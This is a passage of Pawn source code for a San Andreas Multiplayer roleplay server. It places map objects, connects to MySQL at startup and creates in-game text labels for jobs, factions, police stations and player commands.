	punezapada[id] = CreateDynamicObject(3095,2.73268151,1530.51538086,15.71060181,0.00000000,0.00000000,89.99450684, 69); id++;  //object(a51_jetdoor) (18)
	punezapada[id] = CreateDynamicObject(3095,-3.83584642,1530.52392578,15.71060181,0.00000000,0.00000000,89.99450684, 69); id++;  //object(a51_jetdoor) (18)
	punezapada[id] = CreateDynamicObject(3095,-2.21714950,1533.37255859,15.71060181,0.00000000,0.00000000,120.24447632, 69); id++;  //object(a51_jetdoor) (18)
	punezapada[id] = CreateDynamicObject(3095,1.10313940,1527.62878418,15.71060181,0.00000000,0.00000000,119.98986816, 69); id++;  //object(a51_jetdoor) (18)
	punezapada[id] = CreateDynamicObject(3095,-2.21613431,1527.66491699,15.71060181,0.00000000,0.00000000,59.98535156, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,1.09435773,1533.32299805,15.71060181,0.00000000,0.00000000,59.98535156, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,-28.63893890,1535.85449219,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (13)
	punezapada[id] = CreateDynamicObject(3095,-28.64000893,1527.06652832,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (13)
	punezapada[id] = CreateDynamicObject(3095,-28.65423965,1518.42419434,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (13)
	punezapada[id] = CreateDynamicObject(3095,-28.64823532,1509.72668457,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (13)
	punezapada[id] = CreateDynamicObject(3095,-28.63279724,1504.60839844,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (13)
	CreateDynamicObject(14407,-26.15064621,1542.88024902,10.41762352,13.99658203,0.00000000,0.00000000, 69); //object(carter-stairs01) (1)
	CreateDynamicObject(14407,-26.13414764,1497.55407715,10.41762352,13.99658203,0.00000000,179.99450684, 69); //object(carter-stairs01) (3)
	punezapada[id] = CreateDynamicObject(3095,-24.36405563,1504.52832031,10.10000992,90.00000000,175.84582520,274.12121582, 69); id++;  //object(a51_jetdoor) (24)
	punezapada[id] = CreateDynamicObject(3095,-24.37391663,1531.04614258,10.10000992,90.00000000,176.51165771,273.43887329, 69); id++;  //object(a51_jetdoor) (24)
	punezapada[id] = CreateDynamicObject(3095,-24.36447144,1536.04003906,10.10000992,90.00000000,183.41210938,266.53289795, 69); id++;  //object(a51_jetdoor) (24)
	punezapada[id] = CreateDynamicObject(3095,-24.37351227,1498.84167480,8.35001373,55.99731445,270.00000000,180.00000000, 69); id++;  //object(a51_jetdoor) (19)
	punezapada[id] = CreateDynamicObject(3095,-24.36223412,1541.76025391,8.35001373,304.00817871,270.00000000,179.99450684, 69); id++;  //object(a51_jetdoor) (19)
	punezapada[id] = CreateDynamicObject(3095,-24.36075211,1518.10095215,9.57501793,90.00000000,184.92126465,265.04577637, 69); id++;  //object(a51_jetdoor) (26)
	punezapada[id] = CreateDynamicObject(3095,-24.36242867,1509.99023438,10.10000992,90.00000000,183.89083862,266.07070923, 69); id++;  //object(a51_jetdoor) (24)
	punezapada[id] = CreateDynamicObject(3095,-24.35465050,1525.28234863,10.10000992,90.00000000,176.20581055,273.75024414, 69); id++;  //object(a51_jetdoor) (24)
	punezapada[id] = CreateDynamicObject(3095,-24.35037231,1513.93859863,10.84999847,90.00000000,175.35772705,274.61477661, 69); id++;  //object(a51_jetdoor) (28)
	punezapada[id] = CreateDynamicObject(3095,-24.35209274,1524.42919922,10.84999847,90.00000000,175.55303955,274.41406250, 69); id++;  //object(a51_jetdoor) (28)
	punezapada[id] = CreateDynamicObject(3095,-28.09556007,1519.11218262,16.77499962,25.00488281,359.98901367,90.00000000, 69); id++;  //object(a51_jetdoor) (29)
	punezapada[id] = CreateDynamicObject(3095,14.12137413,1551.97155762,11.19999313,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.56059456,1493.23095703,10.15000916,90.00000000,180.00549316,269.98901367, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.58887005,1548.03112793,10.15000916,90.00000000,180.00549316,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.64307117,1551.98400879,11.19999313,90.00000000,180.00549316,269.98904419, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.09531593,1552.00439453,11.19999313,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,12.94569397,1552.02380371,11.19999313,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.02382565,1552.01782227,11.19999313,90.00000000,179.99450684,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,14.17651558,1489.35290527,11.19999313,90.00000000,180.00549316,269.98904419, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.02382565,1489.36279297,11.19999313,90.00000000,179.99450684,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.65943718,1489.35742188,11.19999313,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.15418530,1489.36938477,11.19999313,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,12.90242195,1489.35632324,11.19999313,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.56054688,1548.01855469,10.15000916,90.00000000,180.00549316,269.98901367, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.61704350,1493.24853516,10.15000916,90.00000000,179.99450684,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,13.66001987,1486.65441895,11.71059418,0.00000000,0.00000000,45.00000000, 69); id++;  //object(a51_jetdoor) (9)
	punezapada[id] = CreateDynamicObject(3095,13.51780128,1553.94958496,11.71059418,0.00000000,0.00000000,44.99450684, 69); id++;  //object(a51_jetdoor) (9)
	CreateDynamicObject(10828,53.89693832,1504.15380859,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (3)
	CreateDynamicObject(10828,56.29594421,1504.10644531,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (3)
	CreateDynamicObject(10828,39.98167801,1487.61853027,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,39.83164215,1485.20922852,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,39.90937805,1482.70947266,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,5.07064772,1482.60192871,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,5.24496937,1485.00756836,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,-16.92867661,1482.34350586,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,-16.96541977,1484.36828613,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,-17.01136398,1486.86816406,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,-30.90157700,1504.65502930,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	CreateDynamicObject(10828,-33.29219055,1504.66894531,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	CreateDynamicObject(10828,-33.39352417,1536.86682129,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	CreateDynamicObject(10828,-31.08536148,1536.74536133,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	CreateDynamicObject(10828,-17.19395638,1553.23437500,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,-16.96418190,1555.63146973,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,-16.97966385,1558.17248535,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,16.48400688,1558.12573242,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,16.66704559,1555.63281250,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,34.94194031,1555.60681152,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,34.93159103,1558.13098145,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,51.26736450,1541.49914551,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (2)
	CreateDynamicObject(10828,53.96089935,1541.69592285,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (2)
	CreateDynamicObject(10828,56.29563522,1536.01647949,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (2)
	CreateDynamicObject(10828,53.98807907,1534.34118652,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (2)
	CreateDynamicObject(10828,56.48170853,1541.66345215,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (2)
	CreateDynamicObject(10828,-16.95492744,1482.40795898,19.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,17.35954094,1482.40356445,19.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,39.97454834,1482.24682617,19.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,56.31266022,1498.72961426,19.30128479,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (3)
	CreateDynamicObject(10828,56.28882217,1533.46765137,19.27628517,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (3)
	CreateDynamicObject(10828,56.14291000,1541.70678711,19.27628517,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (3)
	CreateDynamicObject(10828,39.96506119,1558.29748535,19.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,5.47148180,1558.35815430,19.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,-16.99013519,1558.42956543,19.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,-33.61622620,1542.18505859,19.30127335,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	CreateDynamicObject(10828,-33.58349609,1507.48681641,19.37627220,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	CreateDynamicObject(10828,-33.59591293,1498.64550781,19.37627220,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	for(new i = 0; i < 96; i++)
	{
		if(punezapada[i] >= 0)
		{
			for(new a = 0; a < 8; a++)
			{
				SetDynamicObjectMaterial(punezapada[i], a, 17944, "lngblok_lae2", "white64bumpy", 0xFFFFFFFF);
			}
		}
	}
	return 1;
}
// ONGAMEMODEINIT
public OnGameModeInit()
{
	MapaFySnow();
	mysql_log(LOG_ERROR | LOG_WARNING, LOG_TYPE_HTML);
	if(LorH == 1) SQL = mysql_connect(sqlhost,sqluser,sqldb,sqlpass);
	if(LorH == 0) SQL = mysql_connect(sqlhost,sqluser,sqldb,sqlpass);
	SetNameTagDrawDistance(30);
	EnableStuntBonusForAll(0);
	ShowPlayerMarkers(2);
	LimitPlayerMarkerRadius(5.0);

    countdown = 0;

    textile = TextDrawCreate(102.000000, 193.000000, " ");
	TextDrawBackgroundColor(textile, 255);
	TextDrawFont(textile, 2);
	TextDrawLetterSize(textile, 0.500000, 2.399999);
	TextDrawColor(textile, -6749953);
	TextDrawSetOutline(textile, 0);
	TextDrawSetProportional(textile, 1);
	TextDrawSetShadow(textile, 1);
	TextDrawSetSelectable(textile, 0);
	SetTimer("coliziuniPNS", 1000,1);
	incarcaATM();
	//IncarcaBrazi();
	//IncarcaOmZapada();
	if(LorH == 1)
	{
		new qqerry[1000];
		mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `users` SET `Status` = '0'");
		mysql_tquery(SQL,qqerry,"","");
		mysql_format(SQL,qqerry, sizeof(qqerry), "UPDATE `friends` SET `Status` = '0'");
		mysql_tquery(SQL,qqerry,"","");
	}
	for(new c=0;c<CAR_AMOUNT;c++)
	{
		Gas[c] = GasMax;
	}
	new hour,minn,sec;
	gettime(hour,minn,sec);
	new sqlcheck[1000];
	mysql_format(SQL, sqlcheck, sizeof(sqlcheck), "SELECT * FROM `ofertezilnice` where `id`='1'");
	new Cache: ofertezilnice = mysql_query(SQL, sqlcheck);
	if(cache_get_row_count() > 0) ofertazilei = cache_get_field_content_int(0, "ofertazilnica");
	cache_delete(ofertezilnice);
	LoadTextdraws();
	LoadSystems();
	OnLoadAllCars();
	SetGameModeText(SERVER_VERSION);
	SendRconCommand("mapname LS - LV");
	format(objstore, sizeof(objstore), "MOLE: I got nothing, check back with me later.");
	format(cbjstore, sizeof(cbjstore), "HQ: There is nothing in your Vicinity, Out.");

	xhq[1] = 1568.6251;  	yhq[1] = -1690.5358; 	 	zhq[1] = 5.8906;
	xhq[2] = 328.8737;   	yhq[2] = -1513.1195; 	 	zhq[2] = 36.0391;
	xhq[3] = 627.6160;   	yhq[3] = -571.7920;  	 	zhq[3] = 17.6242;
	xhq[4] = 1456.7423;  	yhq[4] = 2773.3423;	 		zhq[4] = 10.8203;
	xhq[5] = 2495.3271;   	yhq[5] = -1690.6740;	 	zhq[5] = 14.7656;
	xhq[6] = 725.6769;  	yhq[6] = -1440.4506;	 	zhq[6] = 13.5391;
	xhq[7] = 689.9420;   	yhq[7] = -1275.9573;  	 	zhq[7] = 13.5595;
	xhq[8] = 2287.1047;   	yhq[8] = 2431.7996;  	 	zhq[8] = 10.8203;
	xhq[9] = -329.5258;  	yhq[9] = 1536.7759;  		zhq[9] = 76.6117;
	xhq[10] = 1455.2687; 	yhq[10] = 750.8684; 	 	zhq[10] = 11.0234;
	xhq[11] = 1081.1794;  	yhq[11] = -345.3979;  	 	zhq[11] = 73.9825;
	xhq[12] = 2435.3064; 	yhq[12] = 1671.0139; 	 	zhq[12] = 10.8203;
	xhq[13] = 2475.7747; 	yhq[13] = -1750.5632;   	zhq[13] = 13.5469;
	xhq[14] = 1173.2563; 	yhq[14] = -1323.3102;   	zhq[14] = 15.3943;
	xhq[15] = -1593.9972; 	yhq[15] = 716.5457;   		zhq[15] = -5.2422;

	//Create3DTextLabel
	CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat'", 0xFFFFFFFF,354.3453,-2030.8059,7.9078, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
	CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat'", 0xFFFFFFFF,1180.5782,-957.0296,42.8693, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
    CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat", 0xFFFFFFFF,1182.0564,-1410.7627,13.4046, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
    CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat", 0xFFFFFFFF,1375.8887,-1043.5226,26.6699, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
    CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat", 0xFFFFFFFF,1576.0544,-1743.9414,13.5469, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
    CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat'", 0xFFFFFFFF,1830.3126,-1884.4764,13.4439, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
    CreateDynamic3DTextLabel("{0066FF}Food Stand{FFFFFF}\nUse the command {0066FF}/eat'", 0xFFFFFFFF,1946.9017,-1938.8370,13.5469, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
    CreateDynamic3DTextLabel("{0066FF}Church of Los Santos{FFFFFF}\nUse the command {0066FF}/marriage'", 0xFFFFFFFF,1765.1915,-1767.0513,13.7606, 10, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
	//
	Create3DTextLabel("HourBox\nWrite /hourgift to receive a gift!",COLOR_LIGHTGREEN,1785.4000000,-1361.3000000,14.8000000,25.0,0); // hourgift 1    -
	CreateObject(19054, 1785.4000000,-1361.3000000,14.8000000,0.0000000,0.0000000,0.0000000);
	Create3DTextLabel("Parachute Cost: 10,000$\nType /buyparachute to buy Parachute",0xFFFFFFFF,-2231.2058,-1736.1578,480.8620,20.0, 0, 1);
	//Create3DTextLabel("Materials Los Santos\nType /buymaterials to buy materials",0xFFFFFFFF,1449.2723,-1848.4255,13.7721,10.0, 0, 1);
    Create3DTextLabel("Gate 1\nType /opengate 1 to open",0xFFFFFFFF,1767.5348,-1581.2784,1742.5024,5.0, 0, 1);
	Create3DTextLabel("{0066FF}Driving School\n{FFFFFF}Type {0066FF}/exam {FFFFFF}to start the test",0xFFFFFFFF,388.5289,-1524.0131,32.2734,20.0, 0, 1);
	
	Create3DTextLabel("{0066FF}bank vault.\n{FFFFFF}Use the command {0066FF}/rob {FFFFFF}to rob the bank.",0xFFFFFFFF,1060.1135,-391.6655,9.2367,20.0, 0, 1);
	Create3DTextLabel("{0066FF}bank vault.\n{FFFFFF}Use the command {0066FF}/rob {FFFFFF}to rob the bank.",0xFFFFFFFF,1060.1135,-391.6655,9.2367,20.0, 1, 1);
	Create3DTextLabel("{0066FF}bank vault.\n{FFFFFF}Use the command {0066FF}/rob {FFFFFF}to rob the bank.",0xFFFFFFFF,1060.1135,-391.6655,9.2367,20.0, 2, 1);
	
	Create3DTextLabel("{0066FF}Los Santos Tunning Garage\n{FFFFFF}Use the command {0066FF}/Tunning {FFFFFF}for Tunning Your Vehicle.",0xFFFFFFFF,1040.8484,-1029.3612,32.1016,20.0, 0, 1);
	Create3DTextLabel("{0066FF}Mehrab",0xFFFFFFFF,356.1505,-2061.9248,9.0661,20.0, 0, 1);
	Create3DTextLabel("{0066FF}Server Updates\n{FFFFFF}Aya Mikhahid Az Akharin Berozresani ha Motale shavid?\nAz Cmd [{0066FF}/updates{FFFFFF}] Estefade Konid.",0xFFFFFFFF,356.1505,-2061.9248,7.8661,20.0, 0, 1);
	//Create3DTextLabel("{0066FF}SPAWN Civil\n{FFFFFF}Press {0066FF}F {FFFFFF}or {0066FF}Enter",0xFFFFFFFF,328.1721,-1513.4829,36.0391,20.0, 0, 1);
	//Create3DTextLabel("{0066FF}SPAWN Civil\n{FFFFFF}Press {0066FF}F {FFFFFF}or {0066FF}Enter",0xFFFFFFFF,328.1721,-1513.4829,36.0391,20.0, 0, 1);
	CreateStreamed3DTextLabel("LS DealerShip!\n\nType /buycar to buy a car\nor /sellcar to sell an existing car!",COLOR_SERVER,1574.8773,-1274.0566,17.6131,20.0,0);
    Create3DTextLabel("Get Drugs\nType /getdrugs to get drugs",0xFFFFFFFF,322.9745,1119.4409,1083.8828,20.0, 0, 1);
    Create3DTextLabel("National Guard Armoury\nPress enter to enter",0xFFFFFFFF,157.3923,1903.2848,18.6660,20.0, 0, 1);
    Create3DTextLabel("LSPD\nPress enter to enter",0xFFFFFFFF,1554.7621,-1675.5870,16.1953,20.0, 0, 1);
    Create3DTextLabel("LVPD\nPress enter to enter",0xFFFFFFFF,2287.1047,2431.7996,10.8203,20.0, 0, 1);
    Create3DTextLabel("F.B.I\nPress enter to enter",0xFFFFFFFF,627.6160,-571.7920,17.6242,20.0, 0, 1);
    Create3DTextLabel("Drugs House\nPress enter to enter",0xFFFFFFFF,2166.4771,-1671.7883,15.0743,20.0, 0, 1);
    //Create3DTextLabel("City Hall\nPress enter to enter",0xFFFFFFFF,1481.1063,-1771.2532,18.7958,20.0, 0, 1);
    Create3DTextLabel("{FFFF99}Los Santos Police Department\nGroup Safe",0x33CCFFFF,256.9322,64.7314,1003.6406,20.0, 0, 1);
    Create3DTextLabel("{FFFF99}Las Venturas Police Department\nGroup Safe",0x33CCFFFF,256.9322,64.7314,1003.6406,20.0, 3, 1);
	Create3DTextLabel("{c2e8f5}Arms Dealer\nType /getjob to get arms dealer job",0x33CCFFFF,1365.8931,-1289.0779,13.5469,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Curier\nType /getjob to get Curier",0x33CCFFFF,1154.3644,-1181.1787,32.8187,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Cement Carrier\nType /getjob to get Cement Carrier",0x33CCFFFF,816.6126,857.0764,12.7891,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Worker Career\nType /getjob to get Worker Career",0x33CCFFFF,1972.4215,-1358.8444,14.1548,20.0, 0, 1);
 	Create3DTextLabel("{c2e8f5}Pocket Thief\nType /getjob to get pocket thief job",0x33CCFFFF,1973.3063,-1304.7975,20.8316,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Drugs Dealer\nType /getjob to get Drugs Dealer job",0x33CCFFFF,2165.5444,-1674.6372,15.0822,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Farmer\nType /getjob to get Farmer job",0x33CCFFFF,-382.8534,-1426.2845,26.2880,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Bus Driver\nType /getjob to get Bus Driver job",0x33CCFFFF,1450.3951,-2286.9661,13.5469,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Garbage\nType /getjob to get Garbage job",0x33CCFFFF,2503.0581,2778.7229,10.8203,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Detective\nType /getjob to get Detective job",0x33CCFFFF,1474.2523,-1771.2463,18.7958,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Mechanic\nType /getjob to get Mechanic job",0x33CCFFFF,910.8003,-1231.9697,16.9766,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Pizza Boy\nType /getjob to get Pizza Boy job",0x33CCFFFF,2123.0237,-1788.8237,13.5547,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Fisherman\nType /getjob to get Fisherman job",0x33CCFFFF,840.9308,-2066.2319,12.8672,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Trucker\nType /getjob to get Trucker job",0x33CCFFFF,-76.8129,-1136.6630,1.0781,20.0, 0, 1);
	Create3DTextLabel("{c2e8f5}Car Jacker\nType /getjob to get Car Jacker job",0x33CCFFFF,2850.9663,891.8728,10.7500,20.0, 0, 1);
 	Create3DTextLabel("{0E7BE9}Materials Pickup!\n\nType /getmats as an Arms Dealer\nto collect materials",COLOR_SERVER,597.5396,-1246.9562,18.2512,20.0, 0, 1);
	Create3DTextLabel("{26C4EC}Door ID: 11\nPD Garage | /garage",COLOR_SERVER,1594.7660,-1619.7109,13.4093,20.0, 0, 1);
	Create3DTextLabel("{26C4EC}Door ID: 37\nRestricted to faction(Los Santos Police Department)\nLSPD Staff HQ",COLOR_SERVER,242.4025,66.4760,1003.6406,20.0, 0, 1);
	Create3DTextLabel("{26C4EC}Door ID: 38\nRestricted to faction(Las Venturas Police Department)\nLVPD Staff HQ",COLOR_SERVER,242.4025,66.4760,1003.6406,20.0, 3, 1);
	Create3DTextLabel("{26C4EC}/garage",COLOR_SERVER,1292.7828,6.8377,1001.0078,20.0, 0, 1);
	Create3DTextLabel("{26C4EC}/exitgaragehitman",COLOR_SERVER,1292.7828,6.8377,1001.0078,20.0, 676, 1);
	Create3DTextLabel("Press enter to exit from LSPD Staff",COLOR_SERVER,238.5806,138.9213,1003.0234,20.0, 333, 1);
	Create3DTextLabel("Press enter to exit from LVPD Staff",COLOR_SERVER,238.5806,138.9213,1003.0234,20.0, 343, 1);
	Create3DTextLabel("{26C4EC}Door ID: 12\nRestricted to faction(Hitman Agency)\nHitman Garage | /garage",COLOR_SERVER,1059.6315,-344.6857,73.9922,20.0, 0, 1);
	Create3DTextLabel("Hitman Agency HQ",COLOR_SERVER,1081.1794,-345.3979,73.9825,20.0, 0, 1);
	areap = Create3DTextLabel("{FF0000}TOPZONE Event Area{FFFFFF}\nEvent Area is closed\nPlease wait...",0xFFFFFFFF,1510.3986,-1059.5723,25.0625,5.0, 0, 1);
    Create3DTextLabel("{26C4EC}LSPD | /elevator",0xFFFFFFFF,1564.8662,-1666.4962,28.3956,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}LVPD Roof | /elevator",0xFFFFFFFF,2339.3237,2461.2197,38.6837,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}Door ID: 30\nRestricted to faction(Los Santos Police Department)\nLSPD Roof | /elevator",0xFFFFFFFF,1568.5891,-1690.3262,5.8906,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}Door ID: 24\nRestricted to faction(Las Venturas Police Department)\nLVPD Roof | /elevator",0xFFFFFFFF,2340.2810,2456.5625,14.9688,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}Los Santos Police Department\nProcessing Entrance\n \n(/arrest)",0xFFFFFFFF,1526.3739,-1678.0635,5.8906,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}Las Venturas Police Department\nProcessing Entrance\n \n(/arrest)",0xFFFFFFFF,2282.1289,2425.7620,3.4692,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}San Fierro Police Department\nProcessing Entrance\n \n(/arrest)",0xFFFFFFFF,-1606.2998,672.7838,-5.2422,20.0, 0, 1);
    Create3DTextLabel("{26C4EC}San Fierro Police Department\nPress F or Enter\n",0xFFFFFFFF,-1593.9972,716.5457,-5.2422,20.0, 0, 1);
    Create3DTextLabel("{FFFF6B}Fun Area\n/funarea",0xFFFF00CC,1154.4122,-1440.0548,15.7969,10.0, 0, 1);
    if(GiftBoxActiv > 0)
	{
	    giftboxobject = CreateObject(19055, 420.7226,-1557.0850,27.5781, 0.0, 0.0,0.0,0.0);
	    giftbox3DText = Create3DTextLabel("TopZone Giftbox\n/getgift",0xA9C4E4CC,420.7226,-1557.0850,27.5781,8.0,0);
 	}
	// CreateDynamic3DTextLabel
	gettime(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
	if(!realtime)
	{
		SetWorldTimeEx(wotime);
	}
    DisableInteriorEnterExits();
	AllowInteriorWeapons(1);
	UsePlayerPedAnims();

	for(new i = 0; i <= sizeof(Peds)-1; i++)
	{
		AddPlayerClass(Peds[i][0],1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1);
	}

    ManualVehicleEngineAndLights();

	for(new i = 1; i < sizeof(CarInfo); i++)
	{
        if(CarInfo[i][cSell] == 2)
        {
        	CarInfo[i][cID] = -2;
        }
	}

	new nrinmatric[128];
	for(new i = 0; i < sizeof(Copcar); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{456FCF}LSPD - 0%d", i);
	    SetVehicleNumberPlate(Copcar[i], nrinmatric);
	    SetVehicleToRespawn(Copcar[i]);
	}
	for(new i = 0; i < sizeof(Fbicar); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{456FCF}FBI - 0%d", i);
	    SetVehicleNumberPlate(Fbicar[i], nrinmatric);
	    SetVehicleToRespawn(Fbicar[i]);
	}
	for(new i = 0; i < sizeof(LVpdcar); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{456FCF}LVPD - 0%d", i);
	    SetVehicleNumberPlate(LVpdcar[i], nrinmatric);
	    SetVehicleToRespawn(LVpdcar[i]);
	}
	for(new i = 0; i < sizeof(SFpdcar); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{456FCF}SFPD - 0%d", i);
	    SetVehicleNumberPlate(SFpdcar[i], nrinmatric);
	    SetVehicleToRespawn(SFpdcar[i]);
	}
	for(new i = 0; i < sizeof(Ngcar); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{456FCF}NG - 0%d", i);
	    SetVehicleNumberPlate(Ngcar[i], nrinmatric);
	    SetVehicleToRespawn(Ngcar[i]);
	}
	for(new i = 0; i < sizeof(Aztecasc); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{7e3937}LAZ - 0%d", i);
	    SetVehicleNumberPlate(Aztecasc[i], nrinmatric);
	    SetVehicleToRespawn(Aztecasc[i]);
	}
	for(new i = 0; i < sizeof(Grovec); i++)
	{
